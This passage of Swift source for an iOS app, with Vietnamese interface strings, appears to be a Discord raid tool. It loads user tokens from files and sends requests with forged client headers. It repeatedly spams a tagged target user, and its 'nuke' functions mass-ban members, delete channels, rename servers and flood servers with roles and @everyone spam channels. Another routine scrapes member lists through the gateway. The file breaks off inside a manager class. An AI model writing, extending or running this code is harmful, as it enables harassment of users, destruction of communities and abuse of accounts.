import SwiftUI
import Foundation
import Security
import AVFoundation
import UniformTypeIdentifiers
import UIKit
import CryptoKit

// ==========================================
// MARK: - DOCUMENT PICKER
// ==========================================
struct DocumentPicker: UIViewControllerRepresentable {
    let contentTypes: [UTType]
    let onPick: (URL) -> Void
    let onCancel: (() -> Void)?
    init(contentTypes: [UTType] = [.item], onPick: @escaping (URL) -> Void, onCancel: (() -> Void)? = nil) {
        self.contentTypes = contentTypes; self.onPick = onPick; self.onCancel = onCancel
    }
    func makeCoordinator() -> Coordinator { Coordinator(self) }
    func makeUIViewController(context: Context) -> UIDocumentPickerViewController {
        let p = UIDocumentPickerViewController(forOpeningContentTypes: contentTypes, asCopy: true)
        p.allowsMultipleSelection = false; p.delegate = context.coordinator; return p
    }
    func updateUIViewController(_ vc: UIDocumentPickerViewController, context: Context) {}
    final class Coordinator: NSObject, UIDocumentPickerDelegate {
        let parent: DocumentPicker
        init(_ p: DocumentPicker) { parent = p }
        func documentPicker(_ c: UIDocumentPickerViewController, didPickDocumentsAt urls: [URL]) {
            if let u = urls.first { parent.onPick(u) }
        }
        func documentPickerWasCancelled(_ c: UIDocumentPickerViewController) { parent.onCancel?() }
    }
}

// ==========================================
// MARK: - MODELS
// ==========================================
struct DiscordUser: Codable { let id, username: String; let globalName: String?; let avatar: String? }

struct TokenInfo: Identifiable, Codable, Equatable {
    var id = UUID()
    let token: String
    var userId, username: String
    var avatarHash: String?
    var isValid: Bool
    var avatarURL: URL? {
        guard let h = avatarHash else { return nil }
        return URL(string: "https://cdn.discordapp.com/avatars/\(userId)/\(h).png?size=128")
    }
}

struct Guild: Codable, Identifiable, Hashable { let id, name: String; let icon: String? }
struct Channel: Codable, Identifiable, Hashable {
    let id: String; let name: String?; let type: Int; let position: Int?; let parentId: String?
    var isSendableText: Bool { type == 0 || type == 5 }
    var isCategory: Bool { type == 4 }
    var displayName: String { name ?? "không tên" }
}
struct ParsedMessage: Identifiable, Hashable { let id = UUID(); let body: String }

struct BotInfo: Codable { let id, username: String; let discriminator, avatar: String?; let bot: Bool? }
struct BotConfig: Codable {
    var token, username, userId: String
    var avatarHash, discriminator: String?
    var displayName: String {
        if let d = discriminator, d != "0" { return "\(username)#\(d)" }
        return username
    }
    var avatarURL: URL? {
        guard let h = avatarHash else { return nil }
        return URL(string: "https://cdn.discordapp.com/avatars/\(userId)/\(h).png?size=128")
    }
}

struct GuildRole: Codable { let id, name: String; let position: Int }
struct BotMember: Codable { let user: BotMemberUser?; let roles: [String]? }
struct BotMemberUser: Codable { let id: String; let username: String?; let bot: Bool? }

struct NukeGuild: Codable {
    let id, name: String
    let icon: String?
    let permissions: String
    let owner: Bool?
    var bits: UInt64 { UInt64(permissions) ?? 0 }
    var isOwner: Bool { owner ?? false }
    var isAdmin: Bool { bits & (1 << 3) != 0 }
    var canManageGuild: Bool { bits & (1 << 5) != 0 }
    var canManageChannels: Bool { bits & (1 << 4) != 0 }
    var canBan: Bool { bits & (1 << 2) != 0 }
    var canManageRoles: Bool { bits & (1 << 28) != 0 }
    var canMassBan: Bool { isOwner || isAdmin || canBan }
    var canDeleteChannels: Bool { isOwner || isAdmin || canManageChannels }
    var canCreateChannels: Bool { isOwner || isAdmin || canManageChannels }
    var canCreateRoles: Bool { isOwner || isAdmin || canManageRoles }
    var canRenameGuild: Bool { isOwner || isAdmin || canManageGuild }
    var canDoAnything: Bool {
        canMassBan || canDeleteChannels || canCreateChannels || canCreateRoles || canRenameGuild
    }
}

struct GuildPermissions {
    var massBan = false, deleteChannels = false, createChannels = false
    var createRoles = false, renameGuild = false
    var any: Bool { massBan || deleteChannels || createChannels || createRoles || renameGuild }
}

enum NukeStepType: String, CaseIterable, Identifiable {
    case massBan = "Mass Ban"
    case deleteChannels = "Xóa kênh"
    case renameGuild = "Đổi tên server"
    case createRoles = "Tạo Role"
    case createChannels = "Tạo kênh + Spam"
    var id: String { rawValue }
    var icon: String {
        switch self {
        case .massBan: return "hammer.fill"
        case .deleteChannels: return "trash.fill"
        case .renameGuild: return "pencil"
        case .createRoles: return "star.fill"
        case .createChannels: return "plus.rectangle.on.rectangle"
        }
    }
}

struct NukeConfig {
    var enabledSteps: Set<NukeStepType> = [.createChannels]
    var stepOrder: [NukeStepType] = NukeStepType.allCases
    var banDelay: Double = 0.02
    var deleteDelay: Double = 0.05
    var createChDelay: Double = 0.10
    var createRoleDelay: Double = 0.10
    var msgDelay: Double = 0.10
    var banRoleId = ""
    var roleName = "Quoc Thang Tools"
    var roleCount = 50
    var channelName = "nuked-by-tool"
    var channelCount = 50
    var messageContent = ""
    var tagEveryone = true
    var newGuildName = ""
}

// ==========================================
// MARK: - BACKGROUND
// ==========================================
class BackgroundManager {
    static let shared = BackgroundManager()
    private var audioPlayer: AVAudioPlayer?
    private var bgTask: UIBackgroundTaskIdentifier = .invalid
    func start() {
        bgTask = UIApplication.shared.beginBackgroundTask { [weak self] in self?.stop() }
        do {
            try AVAudioSession.sharedInstance().setCategory(.playback, mode: .default, options: [.mixWithOthers])
            try AVAudioSession.sharedInstance().setActive(true)
            let sr = 8000, ds = sr * 2
            var h = Data(); h.append(contentsOf: [0x52,0x49,0x46,0x46])
            var cs = UInt32(36 + ds).littleEndian; h.append(Data(bytes: &cs, count: 4))
            h.append(contentsOf: [0x57,0x41,0x56,0x45,0x66,0x6d,0x74,0x20])
            var s1 = UInt32(16).littleEndian; h.append(Data(bytes: &s1, count: 4))
            var af = UInt16(1).littleEndian; h.append(Data(bytes: &af, count: 2))
            var nc = UInt16(1).littleEndian; h.append(Data(bytes: &nc, count: 2))
            var sl = UInt32(sr).littleEndian; h.append(Data(bytes: &sl, count: 4))
            var br = UInt32(sr*2).littleEndian; h.append(Data(bytes: &br, count: 4))
            var ba = UInt16(2).littleEndian; h.append(Data(bytes: &ba, count: 2))
            var bp = UInt16(16).littleEndian; h.append(Data(bytes: &bp, count: 2))
            h.append(contentsOf: [0x64,0x61,0x74,0x61])
            var dc = UInt32(ds).littleEndian; h.append(Data(bytes: &dc, count: 4))
            audioPlayer = try AVAudioPlayer(data: h + Data(repeating: 0, count: ds))
            audioPlayer?.numberOfLoops = -1; audioPlayer?.play()
        } catch {}
    }
    func stop() {
        audioPlayer?.stop(); audioPlayer = nil
        if bgTask != .invalid { UIApplication.shared.endBackgroundTask(bgTask); bgTask = .invalid }
    }
}

// ==========================================
// MARK: - DISCORD CLIENT (SPAM)
// ==========================================
class DiscordClient {
    let token: String; let session: URLSession
    init(token: String) {
        self.token = token
        let cfg = URLSessionConfiguration.default
        let sp = """
        {"os":"Mac OS X","browser":"Chrome","device":"","system_locale":"en-US","browser_user_agent":"Mozilla/5.0","browser_version":"126.0.0.0","os_version":"10.15.7","referrer":"","referring_domain":"","referrer_current":"","referring_domain_current":"","release_channel":"stable","client_build_number":305000,"client_event_source":null}
        """
        cfg.httpAdditionalHeaders = [
            "Authorization": token, "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "X-Super-Properties": Data(sp.utf8).base64EncodedString(), "X-Discord-Locale": "en-US"
        ]
        session = URLSession(configuration: cfg)
    }
    private func check(_ res: URLResponse, _ data: Data) throws {
        guard let h = res as? HTTPURLResponse, (200...299).contains(h.statusCode) else {
            throw NSError(domain: "Discord", code: (res as? HTTPURLResponse)?.statusCode ?? 0,
                          userInfo: [NSLocalizedDescriptionKey: String(data: data, encoding: .utf8) ?? ""])
        }
    }
    func validateToken() async throws -> DiscordUser {
        let (d, r) = try await session.data(from: URL(string: "https://discord.com/api/v10/users/@me")!)
        try check(r, d); return try JSONDecoder().decode(DiscordUser.self, from: d)
    }
    func getAllGuilds() async throws -> [Guild] {
        let (d, r) = try await session.data(from: URL(string: "https://discord.com/api/v10/users/@me/guilds")!)
        try check(r, d); return try JSONDecoder().decode([Guild].self, from: d)
    }
    func getAllChannels(guildId: String) async throws -> [Channel] {
        let (d, r) = try await session.data(from: URL(string: "https://discord.com/api/v10/guilds/\(guildId)/channels")!)
        try check(r, d); return try JSONDecoder().decode([Channel].self, from: d)
    }
    func sendMessage(channelId: String, content: String) async throws {
        var req = URLRequest(url: URL(string: "https://discord.com/api/v10/channels/\(channelId)/messages")!)
        req.httpMethod = "POST"
        req.httpBody = try JSONSerialization.data(withJSONObject: ["content": content])
        let (d, r) = try await session.data(for: req)
        if let h = r as? HTTPURLResponse, h.statusCode == 429,
           let j = try? JSONSerialization.jsonObject(with: d) as? [String: Any],
           let retry = j["retry_after"] as? Double {
            try await Task.sleep(nanoseconds: UInt64((retry + 0.5) * 1_000_000_000))
            return try await sendMessage(channelId: channelId, content: content)
        }
        try check(r, d)
    }
}

// ==========================================
// MARK: - APP STATE
// ==========================================
@MainActor
class AppState: ObservableObject {
    @Published var tokens: [TokenInfo] = [] { didSet { saveTokens() } }
    @Published var activeToken: TokenInfo? = nil
    @Published var isCheckingToken = false
    @Published var guilds: [Guild] = []
    @Published var channels: [Channel] = []
    @Published var isLoading = false
    @Published var delaySeconds: Double = 2.0
    @Published var useTag = true
    @Published var targetUserId = ""
    @Published var addPrefix = false
    @Published var addSuffix = false
    @Published var inputText = ""
    @Published var messages: [ParsedMessage] = []
    @Published var isSending = false
    @Published var totalSent = 0
    @Published var currentMessageStr = ""
    @Published var lastError: String?

    private var client: DiscordClient? { activeToken.map { DiscordClient(token: $0.token) } }
    private var isCancelled = false
    private var sendTask: Task<Void, Never>?

    init() { loadTokens() }
    private func saveTokens() {
        if let e = try? JSONEncoder().encode(tokens) { UserDefaults.standard.set(e, forKey: "SavedTokens") }
    }
    private func loadTokens() {
        if let d = UserDefaults.standard.data(forKey: "SavedTokens"),
           let s = try? JSONDecoder().decode([TokenInfo].self, from: d) {
            tokens = s
            if let a = s.first(where: { $0.isValid }) {
                activeToken = a; Task { await loadGuilds() }
            }
        }
    }
    func addToken(_ s: String) async {
        let c = s.trimmingCharacters(in: .whitespacesAndNewlines)
        guard !c.isEmpty, !tokens.contains(where: { $0.token == c }) else { return }
        isCheckingToken = true
        do {
            let u = try await DiscordClient(token: c).validateToken()
            let t = TokenInfo(token: c, userId: u.id, username: u.globalName ?? u.username, avatarHash: u.avatar, isValid: true)
            tokens.append(t); if activeToken == nil { setActiveToken(t) }
        } catch {
            tokens.append(TokenInfo(token: c, userId: "0", username: "Token chết", avatarHash: nil, isValid: false))
        }
        isCheckingToken = false
    }
    func addTokensFromFile(url: URL) async {
        let got = url.startAccessingSecurityScopedResource()
        defer { if got { url.stopAccessingSecurityScopedResource() } }
        try? FileManager.default.startDownloadingUbiquitousItem(at: url)
        var data: Data?
        let co = NSFileCoordinator(); var err: NSError?
        co.coordinate(readingItemAt: url, options: [], error: &err) { u in data = try? Data(contentsOf: u) }
        if data == nil { data = try? Data(contentsOf: url) }
        guard let d = data else { lastError = "Không đọc file"; return }
        var text: String?
        for enc in [String.Encoding.utf8, .utf16, .utf16LittleEndian, .utf16BigEndian, .windowsCP1252, .isoLatin1, .ascii] {
            if let s = String(data: d, encoding: enc), !s.isEmpty { text = s; break }
        }
        if text == nil { text = String(decoding: d, as: UTF8.self) }
        guard let t = text else { lastError = "File rỗng"; return }
        let clean = t.replacingOccurrences(of: "\u{FEFF}", with: "")
        for l in clean.components(separatedBy: .newlines) where !l.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty {
            await addToken(l)
        }
        lastError = nil
    }
    func setActiveToken(_ t: TokenInfo) { guard t.isValid else { return }; activeToken = t; Task { await loadGuilds() } }
    func deleteToken(at off: IndexSet) {
        if let a = activeToken, off.map({ tokens[$0] }).contains(where: { $0.id == a.id }) { activeToken = nil; guilds = [] }
        tokens.remove(atOffsets: off)
    }
    func loadGuilds() async {
        guard let c = client else { return }
        isLoading = true
        do { guilds = try await c.getAllGuilds().sorted { $0.name < $1.name } }
        catch { lastError = error.localizedDescription }
        isLoading = false
    }
    func loadChannels(for g: Guild) async {
        guard let c = client else { return }
        isLoading = true
        do {
            let all = try await c.getAllChannels(guildId: g.id)
            channels = all.filter { $0.isSendableText || $0.isCategory }.sorted { ($0.position ?? 0) < ($1.position ?? 0) }
        } catch { lastError = error.localizedDescription }
        isLoading = false
    }
    func groupedChannels() -> [(category: Channel?, items: [Channel])] {
        var r: [(Channel?, [Channel])] = []
        let o = channels.filter { $0.isSendableText && $0.parentId == nil }
        if !o.isEmpty { r.append((nil, o)) }
        for c in channels where c.isCategory {
            let k = channels.filter { $0.isSendableText && $0.parentId == c.id }
            if !k.isEmpty { r.append((c, k)) }
        }
        return r
    }
    func parseFile(url: URL) {
        let got = url.startAccessingSecurityScopedResource()
        defer { if got { url.stopAccessingSecurityScopedResource() } }
        try? FileManager.default.startDownloadingUbiquitousItem(at: url)
        var data: Data?; var err: String?
        let co = NSFileCoordinator(); var ce: NSError?
        co.coordinate(readingItemAt: url, options: [], error: &ce) { u in
            do { data = try Data(contentsOf: u) } catch { err = error.localizedDescription }
        }
        if data == nil { do { data = try Data(contentsOf: url) } catch { err = error.localizedDescription } }
        guard let d = data else { lastError = "Không đọc file: \(err ?? "")"; return }
        var c: String?
        for enc in [String.Encoding.utf8, .utf16, .utf16LittleEndian, .utf16BigEndian, .windowsCP1252, .isoLatin1, .ascii, .nonLossyASCII] {
            if let s = String(data: d, encoding: enc), !s.isEmpty { c = s; break }
        }
        if c == nil || c!.isEmpty { c = String(decoding: d, as: UTF8.self) }
        guard let fc = c, !fc.isEmpty else { lastError = "File rỗng"; return }
        inputText = fc.replacingOccurrences(of: "\u{FEFF}", with: "")
        parseDirectInput(); lastError = nil
    }
    func parseDirectInput() {
        messages = inputText.components(separatedBy: .newlines).compactMap {
            let t = $0.trimmingCharacters(in: .whitespacesAndNewlines)
            return t.isEmpty ? nil : ParsedMessage(body: t)
        }
    }
    func startSending(channel: Channel) {
        guard let c = client, !messages.isEmpty else { return }
        if useTag && targetUserId.isEmpty { return }
        isSending = true; isCancelled = false; totalSent = 0; lastError = nil
        BackgroundManager.shared.start()
        sendTask = Task { [weak self] in
            guard let self = self else { return }
            var i = 0
            while !self.isCancelled && !Task.isCancelled {
                let m = self.messages[i]
                var p = ""
                if self.addPrefix { p += "> " }
                if self.addSuffix { p += "# " }
                var fc = p + m.body
                if self.useTag { fc += " <@\(self.targetUserId)>" }
                self.currentMessageStr = fc
                do { try await c.sendMessage(channelId: channel.id, content: fc); self.totalSent += 1 }
                catch { self.lastError = error.localizedDescription }
                i = (i + 1) % self.messages.count
                let d = max(0.1, self.delaySeconds + Double.random(in: -0.3...0.3) * self.delaySeconds)
                do { try await Task.sleep(nanoseconds: UInt64(d * 1_000_000_000)) } catch { break }
            }
            self.isSending = false; self.currentMessageStr = ""
        }
    }
    func stopSending() { isCancelled = true; sendTask?.cancel(); sendTask = nil; isSending = false; BackgroundManager.shared.stop() }
    func hideKeyboard() { UIApplication.shared.sendAction(#selector(UIResponder.resignFirstResponder), to: nil, from: nil, for: nil) }
}

// ==========================================
// MARK: - BOT CLIENT
// ==========================================
class BotClient {
    let auth: String; let session: URLSession
    static let EVERYONE_ALLOW: UInt64 = (1<<10)|(1<<11)|(1<<16)|(1<<15)|(1<<14)|(1<<6)|(1<<17)
    init(token: String) {
        let c = token.trimmingCharacters(in: .whitespacesAndNewlines)
        auth = c.lowercased().hasPrefix("bot ") ? c : "Bot \(c)"
        let cfg = URLSessionConfiguration.default
        cfg.timeoutIntervalForRequest = 30
        cfg.httpAdditionalHeaders = ["Authorization": auth, "Content-Type": "application/json",
                                     "User-Agent": "DiscordBot (https://example.com, 1.0)"]
        session = URLSession(configuration: cfg)
    }
    private func check(_ res: URLResponse, _ data: Data) throws {
        guard let h = res as? HTTPURLResponse else { throw NSError(domain: "B", code: -1, userInfo: [NSLocalizedDescriptionKey: "No HTTP"]) }
        guard (200...299).contains(h.statusCode) else {
            throw NSError(domain: "B", code: h.statusCode, userInfo: [NSLocalizedDescriptionKey:
                "HTTP \(h.statusCode): \(String(data: data, encoding: .utf8)?.prefix(200) ?? "")"])
        }
    }
    func validate() async throws -> BotInfo {
        let (d, r) = try await session.data(from: URL(string: "https://discord.com/api/v10/users/@me")!)
        try check(r, d); return try JSONDecoder().decode(BotInfo.self, from: d)
    }
    func getGuilds() async throws -> [Guild] {
        let (d, r) = try await session.data(from: URL(string: "https://discord.com/api/v10/users/@me/guilds")!)
        try check(r, d); return try JSONDecoder().decode([Guild].self, from: d)
    }
    func getGuildDetail(_ g: String) async throws -> [String: Any] {
        let (d, r) = try await session.data(from: URL(string: "https://discord.com/api/v10/guilds/\(g)")!)
        try check(r, d); return (try JSONSerialization.jsonObject(with: d) as? [String: Any]) ?? [:]
    }
    func getRoles(_ g: String) async throws -> [GuildRole] {
        let (d, r) = try await session.data(from: URL(string: "https://discord.com/api/v10/guilds/\(g)/roles")!)
        try check(r, d); return try JSONDecoder().decode([GuildRole].self, from: d)
    }
    func getMember(_ g: String, userId: String) async throws -> BotMember {
        let (d, r) = try await session.data(from: URL(string: "https://discord.com/api/v10/guilds/\(g)/members/\(userId)")!)
        try check(r, d); return try JSONDecoder().decode(BotMember.self, from: d)
    }
    func getMembers(_ g: String, after: String = "0") async throws -> [BotMember] {
        let (d, r) = try await session.data(from: URL(string: "https://discord.com/api/v10/guilds/\(g)/members?limit=1000&after=\(after)")!)
        try check(r, d); return try JSONDecoder().decode([BotMember].self, from: d)
    }
    func getChannels(_ g: String) async throws -> [Channel] {
        let (d, r) = try await session.data(from: URL(string: "https://discord.com/api/v10/guilds/\(g)/channels")!)
        try check(r, d); return try JSONDecoder().decode([Channel].self, from: d)
    }
    func deleteChannel(_ c: String) async throws {
        var req = URLRequest(url: URL(string: "https://discord.com/api/v10/channels/\(c)")!)
        req.httpMethod = "DELETE"
        let (d, r) = try await session.data(for: req); try check(r, d)
    }
    func createChannel(_ g: String, name: String, openEveryone: Bool) async throws -> String? {
        var req = URLRequest(url: URL(string: "https://discord.com/api/v10/guilds/\(g)/channels")!)
        req.httpMethod = "POST"
        var p: [String: Any] = ["name": name, "type": 0]
        if openEveryone { p["permission_overwrites"] = [["id": g, "type": 0, "allow": String(BotClient.EVERYONE_ALLOW), "deny": "0"]] }
        req.httpBody = try JSONSerialization.data(withJSONObject: p)
        let (d, r) = try await session.data(for: req); try check(r, d)
        return (try? JSONSerialization.jsonObject(with: d) as? [String: Any])?["id"] as? String
    }
    func sendMessage(_ c: String, content: String) async throws {
        var req = URLRequest(url: URL(string: "https://discord.com/api/v10/channels/\(c)/messages")!)
        req.httpMethod = "POST"; req.httpBody = try JSONSerialization.data(withJSONObject: ["content": content])
        let (d, r) = try await session.data(for: req); try check(r, d)
    }
    func createRole(_ g: String, name: String) async throws {
        var req = URLRequest(url: URL(string: "https://discord.com/api/v10/guilds/\(g)/roles")!)
        req.httpMethod = "POST"; req.httpBody = try JSONSerialization.data(withJSONObject: ["name": name])
        let (d, r) = try await session.data(for: req); try check(r, d)
    }
    func renameGuild(_ g: String, newName: String) async throws {
        var req = URLRequest(url: URL(string: "https://discord.com/api/v10/guilds/\(g)")!)
        req.httpMethod = "PATCH"; req.httpBody = try JSONSerialization.data(withJSONObject: ["name": newName])
        let (d, r) = try await session.data(for: req); try check(r, d)
    }
    func banMember(_ g: String, userId: String) async throws {
        var req = URLRequest(url: URL(string: "https://discord.com/api/v10/guilds/\(g)/bans/\(userId)")!)
        req.httpMethod = "PUT"; req.httpBody = try JSONSerialization.data(withJSONObject: ["delete_message_seconds": 0])
        let (d, r) = try await session.data(for: req); try check(r, d)
    }
}

// ==========================================
// MARK: - USER NUKE CLIENT
// ==========================================
class UserNukeClient {
    let token: String; let session: URLSession
    static let EVERYONE_ALLOW: UInt64 = (1<<10)|(1<<11)|(1<<16)|(1<<15)|(1<<14)|(1<<6)|(1<<17)
    init(token: String) {
        self.token = token
        let cfg = URLSessionConfiguration.default; cfg.timeoutIntervalForRequest = 30
        let sp = """
        {"os":"iOS","browser":"Safari","device":"","system_locale":"en-US","browser_user_agent":"Mozilla/5.0 (iPhone)","browser_version":"17.0","os_version":"17.0","referrer":"","referring_domain":"","referrer_current":"","referring_domain_current":"","release_channel":"stable","client_build_number":305000,"client_event_source":null}
        """
        cfg.httpAdditionalHeaders = [
            "Authorization": token, "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
            "X-Super-Properties": Data(sp.utf8).base64EncodedString(),
            "X-Discord-Locale": "en-US", "X-Discord-Timezone": "Asia/Ho_Chi_Minh",
            "X-Context-Properties": "e30=", "Origin": "https://discord.com",
            "Referer": "https://discord.com/channels/@me"
        ]
        session = URLSession(configuration: cfg)
    }
    private func check(_ res: URLResponse, _ data: Data) throws {
        guard let h = res as? HTTPURLResponse else { throw NSError(domain: "UN", code: -1, userInfo: [NSLocalizedDescriptionKey: "No HTTP"]) }
        guard (200...299).contains(h.statusCode) else {
            throw NSError(domain: "UN", code: h.statusCode, userInfo: [NSLocalizedDescriptionKey:
                "HTTP \(h.statusCode): \(String(data: data, encoding: .utf8)?.prefix(200) ?? "")"])
        }
    }
    func validate() async throws -> DiscordUser {
        let (d, r) = try await session.data(from: URL(string: "https://discord.com/api/v10/users/@me")!)
        try check(r, d); return try JSONDecoder().decode(DiscordUser.self, from: d)
    }
    func getGuildsWithPerms() async throws -> [NukeGuild] {
        let (d, r) = try await session.data(from: URL(string: "https://discord.com/api/v10/users/@me/guilds")!)
        try check(r, d); return try JSONDecoder().decode([NukeGuild].self, from: d)
    }
    func getGuildDetail(_ g: String) async throws -> [String: Any] {
        let (d, r) = try await session.data(from: URL(string: "https://discord.com/api/v10/guilds/\(g)")!)
        try check(r, d); return (try JSONSerialization.jsonObject(with: d) as? [String: Any]) ?? [:]
    }
    func getRoles(_ g: String) async throws -> [GuildRole] {
        let (d, r) = try await session.data(from: URL(string: "https://discord.com/api/v10/guilds/\(g)/roles")!)
        try check(r, d); return try JSONDecoder().decode([GuildRole].self, from: d)
    }
    func getMember(_ g: String, uid: String) async throws -> BotMember {
        let (d, r) = try await session.data(from: URL(string: "https://discord.com/api/v10/guilds/\(g)/members/\(uid)")!)
        try check(r, d); return try JSONDecoder().decode(BotMember.self, from: d)
    }
    func getChannels(_ g: String) async throws -> [Channel] {
        let (d, r) = try await session.data(from: URL(string: "https://discord.com/api/v10/guilds/\(g)/channels")!)
        try check(r, d); return try JSONDecoder().decode([Channel].self, from: d)
    }
    func deleteChannel(_ c: String) async throws {
        var req = URLRequest(url: URL(string: "https://discord.com/api/v10/channels/\(c)")!)
        req.httpMethod = "DELETE"; let (d, r) = try await session.data(for: req); try check(r, d)
    }
    func createChannel(_ g: String, name: String, openEveryone: Bool) async throws -> String? {
        var req = URLRequest(url: URL(string: "https://discord.com/api/v10/guilds/\(g)/channels")!)
        req.httpMethod = "POST"
        var p: [String: Any] = ["name": name, "type": 0]
        if openEveryone { p["permission_overwrites"] = [["id": g, "type": 0, "allow": String(UserNukeClient.EVERYONE_ALLOW), "deny": "0"]] }
        req.httpBody = try JSONSerialization.data(withJSONObject: p)
        let (d, r) = try await session.data(for: req); try check(r, d)
        return (try? JSONSerialization.jsonObject(with: d) as? [String: Any])?["id"] as? String
    }
    func sendMessage(_ c: String, content: String) async throws {
        var req = URLRequest(url: URL(string: "https://discord.com/api/v10/channels/\(c)/messages")!)
        req.httpMethod = "POST"; req.httpBody = try JSONSerialization.data(withJSONObject: ["content": content])
        let (d, r) = try await session.data(for: req); try check(r, d)
    }
    func createRole(_ g: String, name: String) async throws {
        var req = URLRequest(url: URL(string: "https://discord.com/api/v10/guilds/\(g)/roles")!)
        req.httpMethod = "POST"; req.httpBody = try JSONSerialization.data(withJSONObject: ["name": name])
        let (d, r) = try await session.data(for: req); try check(r, d)
    }
    func renameGuild(_ g: String, newName: String) async throws {
        var req = URLRequest(url: URL(string: "https://discord.com/api/v10/guilds/\(g)")!)
        req.httpMethod = "PATCH"; req.httpBody = try JSONSerialization.data(withJSONObject: ["name": newName])
        let (d, r) = try await session.data(for: req); try check(r, d)
    }
    func banMember(_ g: String, uid: String) async throws {
        var req = URLRequest(url: URL(string: "https://discord.com/api/v10/guilds/\(g)/bans/\(uid)")!)
        req.httpMethod = "PUT"; req.httpBody = try JSONSerialization.data(withJSONObject: ["delete_message_seconds": 0])
        let (d, r) = try await session.data(for: req); try check(r, d)
    }

    func fetchMembersWS(guildId: String,
                        onMember: @escaping ([String: Any]) -> Void,
                        onProgress: @escaping (Int) -> Void) async throws {
        let channels = try await getChannels(guildId)
        guard let ref = channels.first(where: { $0.type == 0 || $0.type == 5 })?.id else { return }
        let detail = try await getGuildDetail(guildId)
        let total = (detail["approximate_member_count"] as? Int) ?? (detail["member_count"] as? Int) ?? 1000

        guard let url = URL(string: "wss://gateway.discord.gg/?v=10&encoding=json") else { return }
        let ws = session.webSocketTask(with: url); ws.resume()
        defer { ws.cancel(with: .goingAway, reason: nil) }

        guard case .string(let hs) = try await ws.receive(),
              let hd = hs.data(using: .utf8),
              let hello = try? JSONSerialization.jsonObject(with: hd) as? [String: Any],
              let hbi = (hello["d"] as? [String: Any])?["heartbeat_interval"] as? Int else { return }
        let hbInt = Double(hbi) / 1000.0

        let hbTask = Task {
            while !Task.isCancelled {
                try? await Task.sleep(nanoseconds: UInt64(hbInt * 1_000_000_000))
                try? await ws.send(.string("{\"op\":1,\"d\":null}"))
            }
        }
        defer { hbTask.cancel() }

        let identify: [String: Any] = ["op": 2, "d": [
            "token": token, "capabilities": 125,
            "properties": ["os": "iOS", "browser": "Safari", "device": "iPhone"],
            "compress": false,
            "presence": ["status": "online", "since": 0, "activities": [], "afk": false]
        ]]
        let idData = try JSONSerialization.data(withJSONObject: identify)
        try await ws.send(.string(String(data: idData, encoding: .utf8)!))

        var ready = false; var att = 0
        while !ready && att < 50 {
            att += 1
            if case .string(let s) = try await ws.receive(),
               let d = try? JSONSerialization.jsonObject(with: s.data(using: .utf8)!) as? [String: Any] {
                if (d["t"] as? String) == "READY" { ready = true }
                if (d["op"] as? Int) == 9 { throw NSError(domain: "WS", code: 9, userInfo: [NSLocalizedDescriptionKey: "Invalid Session"]) }
            }
        }
        guard ready else { return }

        var seen = Set<String>()
        var start = 0, end = 99
        var empty = 0
        let maxIter = max(50, total / 100 + 20); var iter = 0

        while empty < 2 && iter < maxIter && !Task.isCancelled {
            iter += 1
            let req: [String: Any] = ["op": 14, "d": [
                "guild_id": guildId, "channels": [ref: [[start, end]]], "threads": false, "typing": true
            ]]
            let rData = try JSONSerialization.data(withJSONObject: req)
            try await ws.send(.string(String(data: rData, encoding: .utf8)!))

            var gotNew = false
            let deadline = Date().addingTimeInterval(3.0)
            while Date() < deadline && !Task.isCancelled {
                let rTask = Task { try await ws.receive() }
                let tTask = Task { try? await Task.sleep(nanoseconds: 3_000_000_000); rTask.cancel() }
                defer { tTask.cancel() }
                do {
                    let msg = try await rTask.value
                    if case .string(let s) = msg,
                       let d = try? JSONSerialization.jsonObject(with: s.data(using: .utf8)!) as? [String: Any],
                       (d["t"] as? String) == "GUILD_MEMBER_LIST_UPDATE",
                       let dd = d["d"] as? [String: Any], let ops = dd["ops"] as? [[String: Any]] {
                        for op in ops {
                            let ot = op["op"] as? String
                            let items: [[String: Any]]
                            if ot == "SYNC" { items = op["items"] as? [[String: Any]] ?? [] }
                            else if ot == "UPDATE" { items = (op["item"] as? [String: Any]).map { [$0] } ?? [] }
                            else { continue }
                            for item in items {
                                if let m = item["member"] as? [String: Any],
                                   let u = m["user"] as? [String: Any],
                                   let uid = u["id"] as? String, !seen.contains(uid) {
                                    seen.insert(uid); gotNew = true; onMember(m)
                                }
                            }
                        }
                        onProgress(seen.count)
                        if seen.count >= total { return }
                        if gotNew { break }
                    }
                } catch { break }
            }
            empty = gotNew ? 0 : empty + 1
            start += 100; end += 100
            try? await Task.sleep(nanoseconds: 150_000_000)
        }
    }

    func fetchMembersHTTP(guildId: String,
                          onMember: @escaping ([String: Any]) -> Void,
                          onProgress: @escaping (Int) -> Void) async {
        var after = "0"; var count = 0
        while !Task.isCancelled {
            do {
                let (d, r) = try await session.data(from: URL(string: "https://discord.com/api/v10/guilds/\(guildId)/members?limit=1000&after=\(after)")!)
                guard let h = r as? HTTPURLResponse, h.statusCode == 200 else { return }
                guard let arr = try? JSONSerialization.jsonObject(with: d) as? [[String: Any]], !arr.isEmpty else { return }
                for m in arr { onMember(m) }
                count += arr.count; onProgress(count)
                if arr.count < 1000 { return }
                after = ((arr.last?["user"] as? [String: Any])?["id"] as? String) ?? after
                try? await Task.sleep(nanoseconds: 500_000_000)
            } catch { return }
        }
    }
}

// ==========================================
// MARK: - BOT MANAGER
// ==========================================
@MainActor
class BotManager: ObservableObject {
    @Published var config: BotConfig? = nil { didSet { saveConfig() } }
    @Published var isCheckingToken = false
    @Published var tokenError: String?
    @Published var botGuilds: [Guild] = []
    @Published var isLoadingGuilds = false
    @Published var isNuking = false
    @Published var nukeLog: [String] = []
    @Published var banSuccess = 0
    @Published var banFailed = 0
    @Published var channelsDeleted = 0
    @Published var channelsCreated = 0
    @Published var messagesSent = 0
    @Published var rolesCreated = 0
    @Published var currentPhase = ""
    @Published var phaseProgress: Double = 0
    private var isCancelled = false
    private let key = "BotConfigV1"
    private var client: BotClient? { config.map { BotClient(token: $0.token) } }

    init() { loadConfig() }
    private func saveConfig() {
        if let c = config, let d = try? JSONEncoder().encode(c) { UserDefaults.standard.set(d, forKey: key) }
        else { UserDefaults.standard.removeObject(forKey: key) }
    }
    private func loadConfig() {
        if let d = UserDefaults.standard.data(forKey: key),
           let c = try? JSONDecoder().decode(BotConfig.self, from: d) {
            config = c; Task { await loadGuilds() }
        }
    }
